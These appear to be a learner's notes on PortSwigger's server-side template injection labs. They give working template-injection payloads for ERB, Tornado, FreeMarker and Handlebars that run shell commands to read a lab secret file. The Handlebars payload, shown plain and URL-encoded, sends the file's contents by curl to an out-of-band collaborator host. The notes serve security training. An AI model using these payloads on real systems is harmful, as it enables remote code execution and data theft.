# [Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)

## Lab

- practitioner:
  - [1. Basic server-side template injection](./lab/1.%20Basic%20server-side%20template%20injection.md)
  - [2. Basic server-side template injection (code context)](./lab/2.%20Basic%20server-side%20template%20injection%20(code%20context).md)
  - [3. Server-side template injection using documentation](./lab/3.%20Server-side%20template%20injection%20using%20documentation.md)
  - [4. Server-side template injection in an unknown language with a documented exploit](./lab/4.%20Server-side%20template%20injection%20in%20an%20unknown%20language%20with%20a%20documented%20exploit.md)
  - [5. Server-side template injection with information disclosure via user-supplied objects](./lab/5.%20Server-side%20template%20injection%20with%20information%20disclosure%20via%20user-supplied%20objects.md)

## payloads

- <https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection>
- <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection>

erb ruby:

```ruby
<%= system('cat /home/carlos/secret') %>
```

tornado python:

```python
{%import os%}{{os.system('cat /home/carlos/secret')}}
```

freemarker java:

```java
${"freemarker.template.utility.Execute"?new()("cat /home/carlos/secret")}
```

handlebars nodejs:

```js
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('curl http://96dqv77vsq70wc2n56jjmqprvi19p7dw.oastify.com -d `cat /home/carlos/secret`');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

URLencoded:
%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%63%75%72%6c%20%68%74%74%70%3a%2f%2f%39%36%64%71%76%37%37%76%73%71%37%30%77%63%32%6e%35%36%6a%6a%6d%71%70%72%76%69%31%39%70%37%64%77%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%20%2d%64%20%60%63%61%74%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%73%65%63%72%65%74%60%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d
```

## Summary

Try to fuzz every user input.

Maybe some functions have ssti vulnerable appear only after logging into a special account.

## References

[conference presentation](https://portswigger.net/research/server-side-template-injection)

[portswigger's research](https://portswigger.net/research/server-side-template-injection)
